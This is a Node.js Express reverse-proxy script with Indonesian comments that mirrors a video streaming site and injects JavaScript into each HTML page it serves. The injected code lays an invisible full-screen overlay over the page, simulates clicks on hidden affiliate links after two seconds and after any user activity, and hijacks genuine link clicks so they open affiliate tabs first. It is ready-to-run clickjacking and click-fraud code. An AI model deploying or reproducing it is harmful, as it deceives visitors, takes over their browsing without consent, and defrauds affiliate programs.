const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BASE_URL = 'https://vidstrm.cloud';

const AFFILIATE_LINKS = [
  'https://doobf.pro/8AQUp3ZesV',
  'https://doobf.pro/9pYio8K2cw',
  'https://doobf.pro/8pgBcJjIzl',
  'https://doobf.pro/60M0F7txlS',
  'https://vidoyy.fun/7VAo1N0hIp',
  'https://vidoyy.fun/9KcSCm0Xb7',
  'https://vidoyy.fun/3LLF3lT65E',
  'https://vidoyy.fun/6VIGpbCEoc'
];

app.use(async (req, res) => {
  try {
    const targetUrl = BASE_URL + req.originalUrl;
    console.log(`Fetching: ${targetUrl}`);
    
    const response = await fetch(targetUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    
    if (!response.ok) return res.redirect(targetUrl);
    
    let html = await response.text();
    const contentType = response.headers.get('content-type') || 'text/html';
    
    if (contentType.includes('text/html')) {
      // SCRIPT UNTUK AUTO-CLICK TRANSPARAN
      const injectScript = `
        <script>
          const AFFILIATE_LINKS = ${JSON.stringify(AFFILIATE_LINKS)};
          
          // Buat invisible overlay yang menutupi seluruh halaman
          function createInvisibleOverlay() {
            const overlay = document.createElement('div');
            overlay.id = 'auto-click-overlay';
            overlay.style.cssText = \`
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background: transparent;
              z-index: 2147483647; /* Max z-index */
              cursor: pointer;
            \`;
            
            // Buat invisible link di tengah overlay
            const invisibleLink = document.createElement('a');
            invisibleLink.id = 'auto-shopee-link';
            invisibleLink.href = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
            invisibleLink.target = '_blank';
            invisibleLink.style.cssText = \`
              display: block;
              width: 100%;
              height: 100%;
              opacity: 0;
              position: absolute;
              top: 0;
              left: 0;
            \`;
            
            overlay.appendChild(invisibleLink);
            document.body.appendChild(overlay);
            
            return { overlay, invisibleLink };
          }
          
          // Function untuk simulate click
          function simulateClick(element) {
            const clickEvent = new MouseEvent('click', {
              view: window,
              bubbles: true,
              cancelable: true
            });
            element.dispatchEvent(clickEvent);
          }
          
          // Function untuk auto-click setelah delay
          function autoClickShopee() {
            console.log('🔄 Auto-clicking Shopee link...');
            
            // Buat overlay
            const { overlay, invisibleLink } = createInvisibleOverlay();
            
            // Simulate click pada link setelah 100ms
            setTimeout(() => {
              console.log('🤖 Simulating click on:', invisibleLink.href);
              
              // Method 1: Trigger click event
              simulateClick(invisibleLink);
              
              // Method 2: Direct click (lebih reliable)
              invisibleLink.click();
              
              // Method 3: Location href sebagai backup
              setTimeout(() => {
                window.location.href = invisibleLink.href;
              }, 500);
              
              // Hapus overlay setelah 2 detik
              setTimeout(() => {
                if (overlay.parentNode) {
                  overlay.parentNode.removeChild(overlay);
                }
              }, 2000);
              
            }, 100);
          }
          
          // AUTO-CLICK SETELAH 2 DETIK
          let autoClickTimer = setTimeout(() => {
            console.log('⏰ Timeout reached, auto-clicking...');
            autoClickShopee();
          }, 2000);
          
          // Reset timer jika user aktif (tapi tetap akan auto-click)
          ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
            document.addEventListener(event, function(e) {
              // Biarkan user klik asli terjadi dulu
              setTimeout(() => {
                // Tetap trigger auto-click setelah user interaction
                clearTimeout(autoClickTimer);
                autoClickTimer = setTimeout(() => {
                  autoClickShopee();
                }, 1000);
              }, 300);
            }, { passive: true });
          });
          
          // Tangani klik user asli
          document.addEventListener('click', function(e) {
            // Cegah double action
            if (e.target.id === 'auto-shopee-link' || 
                e.target.id === 'auto-click-overlay') {
              return;
            }
            
            // Cari link yang diklik
            const link = e.target.closest('a');
            if (link && link.href) {
              e.preventDefault();
              e.stopPropagation();
              
              // 1. Buka Shopee affiliate
              const shopeeUrl = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
              window.open(shopeeUrl, '_blank');
              
              // 2. Redirect ke tujuan asli setelah delay
              setTimeout(() => {
                window.location.href = link.href;
              }, 800);
            }
          }, true);
          
          console.log('🤖 Auto-click system aktif!');
        </script>
        
        <style>
          /* Transparent animation untuk overlay */
          #auto-click-overlay {
            animation: pulseBackground 2s infinite;
          }
          @keyframes pulseBackground {
            0% { background: rgba(238, 77, 45, 0.01); }
            50% { background: rgba(238, 77, 45, 0.03); }
            100% { background: rgba(238, 77, 45, 0.01); }
          }
        </style>
      `;
      
      // Inject script
      if (html.includes('</head>')) {
        html = html.replace('</head>', injectScript + '</head>');
      } else {
        html = injectScript + html;
      }
      
      // Rewrite links
      html = html.replace(
        /(href|src|action)=["'](https?:)?\/\/vidstrm\.cloud(\/[^"']*)["']/gi,
        (match, attr, protocol, path) => `${attr}="${path}"`
      );
    }
    
    res.set({
      'Content-Type': contentType,
      'Cache-Control': 'no-cache'
    }).send(html);
    
  } catch (error) {
    console.error('Error:', error.message);
    // Fallback langsung ke affiliate
    const randomLink = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
    res.redirect(randomLink);
  }
});

app.listen(PORT, () => {
  console.log(`🤖 Server dengan Auto-Click System`);
  console.log(`👉 Akan auto-click setelah 2 detik`);
  console.log(`🎯 Total links: ${AFFILIATE_LINKS.length}`);
});
